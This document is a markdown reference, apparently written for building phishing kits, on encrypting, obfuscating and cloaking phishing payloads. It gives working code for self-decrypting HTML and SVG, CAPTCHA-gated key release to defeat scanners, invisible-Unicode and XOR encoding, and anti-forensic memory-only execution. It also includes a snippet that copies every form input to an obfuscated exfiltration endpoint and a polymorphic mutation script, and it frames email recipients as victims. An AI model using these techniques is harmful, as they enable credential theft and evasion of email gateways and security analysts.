# Payload Encryption Methods

Never store plaintext payload in source — always encrypt. Standard: PBKDF2 (SHA-256) derivation + AES-256-GCM via Web Crypto API.

## AES-256-GCM with PBKDF2 (recommended, 2025-2026)

### Browser-side decryption

```javascript
async function decrypt(encryptedB64, password) {
    var data = Uint8Array.from(atob(encryptedB64), function(c){ return c.charCodeAt(0); });
    var salt = data.slice(0, 16);
    var iv = data.slice(16, 28);
    var ciphertext = data.slice(28);
    var keyMaterial = await crypto.subtle.importKey('raw',
        new TextEncoder().encode(password), {name: 'PBKDF2'}, false, ['deriveKey']);
    var key = await crypto.subtle.deriveKey(
        {name: 'PBKDF2', salt: salt, iterations: 100000, hash: 'SHA-256'},
        keyMaterial, {name: 'AES-GCM', length: 256}, false, ['decrypt']);
    var plain = await crypto.subtle.decrypt({name: 'AES-GCM', iv: iv}, key, ciphertext);
    return new TextDecoder().decode(plain);
}
```

Payload format: `base64(salt[16] + iv[12] + ciphertext + authTag[16])`.
PBKDF2 iterations: 100,000 (OWASP minimum); StatiCrypt uses 600,000.

### Node.js encryption script (build-time)

```javascript
const crypto = require('crypto');
const fs = require('fs');

function encryptPayload(content, password) {
    const salt = crypto.randomBytes(16);
    const iv = crypto.randomBytes(12);
    const key = crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha256');
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    let encrypted = cipher.update(content, 'utf8');
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    const authTag = cipher.getAuthTag();
    return Buffer.concat([salt, iv, encrypted, authTag]).toString('base64');
}

function generateEncryptedHTML(inputFile, outputFile, password) {
    const html = fs.readFileSync(inputFile, 'utf8');
    const encrypted = encryptPayload(html, password);
    const template = `<!DOCTYPE html>
<html><head><meta charset="utf-8"></head><body>
<div id="p" style="display:none">${encrypted}</div>
<script>
(async()=>{
  var d=Uint8Array.from(atob(document.getElementById('p').textContent),
    function(c){return c.charCodeAt(0)});
  var s=d.slice(0,16),iv=d.slice(16,28),ct=d.slice(28);
  var km=await crypto.subtle.importKey('raw',
    new TextEncoder().encode(location.hash.slice(1)),
    {name:'PBKDF2'},false,['deriveKey']);
  var k=await crypto.subtle.deriveKey(
    {name:'PBKDF2',salt:s,iterations:100000,hash:'SHA-256'},
    km,{name:'AES-GCM',length:256},false,['decrypt']);
  var pt=await crypto.subtle.decrypt({name:'AES-GCM',iv:iv},k,ct);
  document.open();
  document.write(new TextDecoder().decode(pt));
  document.close();
})();
<\/script></body></html>`;
    fs.writeFileSync(outputFile, template);
}
```

Usage: `generateEncryptedHTML('page.html', 'encrypted.html', 'my-secret-key')`
Open via: `https://site.com/encrypted.html#my-secret-key`

### Python encryption script

```python
import os, base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

def encrypt_payload(content, password):
    salt = os.urandom(16)
    iv = os.urandom(12)
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
    key = kdf.derive(password.encode())
    ciphertext = AESGCM(key).encrypt(iv, content.encode(), None)
    return base64.b64encode(salt + iv + ciphertext).decode()
```

### CryptoJS fallback (file:// and HTTP contexts)

Web Crypto requires HTTPS. Email attachments/HTTP pages → CryptoJS (~50KB, works in all contexts; used by Tycoon2FA + Greatness):

```javascript
// Encrypt (Node.js)
const CryptoJS = require('crypto-js');
const encrypted = CryptoJS.AES.encrypt(payload, passphrase).toString();

// Decrypt (browser, works everywhere including file://)
const decrypted = CryptoJS.AES.decrypt(encrypted, passphrase)
    .toString(CryptoJS.enc.Utf8);
```

### StatiCrypt CLI (quick encrypt)

```bash
npx staticrypt page.html -p "passphrase-here"
```

Self-decrypting HTML with password prompt. AES-CBC, 600K PBKDF2 iterations.

## Key Sources

| Source | How | Pros | Cons |
|--------|-----|------|------|
| Server after CAPTCHA | POST /api/verify → key | Best control, one-time use | Needs server infra |
| URL fragment | `#key=abc` → `location.hash` | Never sent to server/logs | Visible in address bar |
| HTTP response header | Custom header after validation | Never in DOM/HTML source | Visible in DevTools Network |
| Turnstile token hash | `SHA256(token).slice(0,32)` | Requires human, unique per session | Depends on CF availability |
| Email hash | `SHA256(victim@email.com)` | Per-victim, validates targeting | Predictable if email known |
| Hardcoded in JS | Variable in script | Simplest, no server | Recoverable by analyst |
| Split key | URL + cookie + server, all needed | Defense in depth | Complex implementation |

GlassWorm pattern: per-request key in custom HTTP response header + AES-256-CBC payload in body.

## CAPTCHA-Gated Decryption

### Pattern A: server releases key after Turnstile

```javascript
turnstile.render('#captcha', {
    sitekey: SITE_KEY,
    callback: async function(token) {
        var resp = await fetch('/api/verify', {
            method: 'POST',
            body: JSON.stringify({token: token})
        });
        var data = await resp.json();
        var decrypted = await decrypt(ENCRYPTED_PAYLOAD, data.key);
        document.open();
        document.write(decrypted);
        document.close();
    }
});
```

### Pattern B: token hash as key component

Turnstile token (or its SHA256) = part of decryption key. Unique per session, requires human interaction.

### Pattern C: Palladium + key (existing Palladium setups)

Palladium pass → server sets cookie with key → client decrypts. Bot fails Palladium → no cookie → no key → encrypted blob.

## Encrypted HTML Attachments (email phishing)

Key in URL fragment — never sent to server, invisible to gateways. Flow:
1. Encrypt HTML at build time
2. Email: `attachment.html#decryption-key-here`
3. JS reads `location.hash`, extracts key
4. Decrypt embedded blob → `document.write()`

Gateway sees only random Base64 — no URLs/forms, undecryptable without key.
Real (Apr 2025): O365 phishing via AES+PBKDF2 HTML + key delivered via malicious npm package on jsDelivr CDN.

## XOR (lightweight, inline strings)

```javascript
function xorDec(encoded, key) {
    var str = atob(encoded), result = '';
    for (var i = 0; i < str.length; i++)
        result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    return result;
}
```

Salty2FA static key: `684c985a29c67596b5e66d6028bdad6d`.

## Invisible Unicode (Tycoon2FA, 2025)

Payload as invisible Hangul chars — source looks like blank whitespace. U+FFA0 = binary 0, U+3164 = binary 1, 8 chars = 1 byte.

```javascript
function encodeInvisible(js) {
    var bin = '';
    for (var i = 0; i < js.length; i++)
        bin += js.charCodeAt(i).toString(2).padStart(8, '0');
    return bin.replace(/0/g, '\uFFA0').replace(/1/g, '\u3164');
}

function decodeInvisible(inv) {
    var bin = '', js = '';
    for (var i = 0; i < inv.length; i++)
        bin += inv.charCodeAt(i) === 0xFFA0 ? '0' : '1';
    for (var i = 0; i < bin.length; i += 8)
        js += String.fromCharCode(parseInt(bin.substring(i, i + 8), 2));
    return js;
}
```

Execute via `Proxy` get-trap — code never in parseable form until runtime.
GlassWorm variant: Variation Selectors (U+FE00-FE0F), 4 bits (nibble) each, 50% smaller. Key from HTTP headers.

## Multi-Layer Nesting (Tycoon2FA full chain)

Build (inner → outer): `JS payload → AES → XOR → LZString → Base64 → Invisible Unicode`
Runtime (outer → inner): `Unicode decode → Base64 → LZString → XOR → AES → Proxy eval()`

## Anti-Forensics

### DOM self-removal (Tycoon2FA)

```javascript
var currentScript = document.currentScript;
currentScript.parentNode.removeChild(currentScript);
```

Script keeps executing in memory — no trace in DOM inspector.

### Memory-only execution

```javascript
async function executeEncrypted(encData, key) {
    var code = await decrypt(encData, key);
    // Option 1: indirect eval
    (0, eval)(code);
    // Option 2: Blob URL (self-cleaning)
    var blob = new Blob([code], {type: 'text/javascript'});
    var url = URL.createObjectURL(blob);
    var s = document.createElement('script');
    s.src = url;
    s.onload = function(){ URL.revokeObjectURL(url); s.remove(); };
    document.head.appendChild(s);
}
```

### One-time decryption

Server deletes key after first request; client nulls key after decrypt:
```javascript
var key = await getKey();
var decrypted = await decrypt(payload, key);
key = null;
```

## SVG Encrypted Payloads (1800% increase 2025)

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    var Y = "4a6f686e..."; // hex-encoded XOR payload
    var q = "k3y";
    var v = Y.match(/.{2}/g).map(function(hex, i) {
        return String.fromCharCode(parseInt(hex, 16) ^ q.charCodeAt(i % q.length));
    }).join('');
    new Function(v)();
  ]]></script>
</svg>
```

Types: redirector SVGs, self-contained pages (Base64 HTML inside SVG), DOM injection.
Backend polymorphism: JS randomized per request — 5 requests = 5 different scripts.

## DOM Cloaking

### Dynamic form construction

```javascript
var form = document.createElement('form');
form.method = 'POST';
var p = ['ht','tp','s:','//','co','ll','ec','t.','ex','am','pl','e.',atob('Y29t'),'/','lo','g'];
form.action = p.join('');
document.querySelectorAll('input').forEach(function(input){
    var h = document.createElement('input');
    h.type = 'hidden'; h.name = input.name; h.value = input.value;
    form.appendChild(h);
});
document.body.appendChild(form);
form.submit();
```

### Blob URI rendering (GhostFrame)

Screenshot as blob image + invisible overlaid inputs. No `<form>`, no `action=` in source.

### WOFF font substitution cipher

Custom font remaps glyphs — HTML garbled, renders correctly only with embedded font. Pure CSS, no JS.

## Polymorphic JS

### Server-side mutation

```python
import random, string

def mutate(template):
    for orig in ['exfilUrl', 'formData', 'sendData', 'encKey']:
        replacement = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))
        template = template.replace(orig, replacement)
    for _ in range(random.randint(3, 8)):
        junk = 'var ' + ''.join(random.choices(string.ascii_lowercase, k=8)) + '=' + str(random.randint(1, 99999)) + ';'
        pos = random.randint(0, len(template))
        template = template[:pos] + junk + template[pos:]
    return template
```

### LLM-based mutation (Unit42, Jan 2026)

Benign skeleton page → client JS calls LLM API (DeepSeek, Gemini) for generic functions → assembles and evals unique code per visit. 36% of malicious pages use runtime assembly; each visit syntactically unique — no stable signature.

## Web Crypto API Limitations

- Requires HTTPS (or localhost); `file://`/HTTP → CryptoJS fallback
- Email HTML attachments: CryptoJS (~50KB), not Web Crypto
- All modern browsers support AES-GCM + PBKDF2
- StatiCrypt v3 requires HTTPS (Web Crypto); v2 supports CryptoJS for HTTP
